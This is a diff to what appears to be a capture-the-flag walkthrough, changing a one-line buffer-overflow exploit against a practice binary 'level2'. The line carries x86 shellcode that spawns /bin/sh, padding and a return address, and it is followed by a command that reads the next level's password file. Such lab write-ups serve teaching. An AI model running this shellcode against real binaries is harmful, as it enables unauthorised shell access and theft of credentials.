@@ -269,7 +269,7 @@ This will be the payload for our binary.
 
 We can execute the buffer overflow with this line. Of course, because we are running a shell through a pipe, we can keep the `stdin` open like the same trick from the last level:
 ```bash
-$ (printf "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80%-59s\x08\xa0\x04\x08\n" | tr ' ' '\0' ; cat) | ./level2 
+$ (printf "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80%-59s\x08\xa0\x04\x08\n" ; cat) | ./level2 
 1���Qh//shh/bin��
 
 cat /home/user/level3/.pass
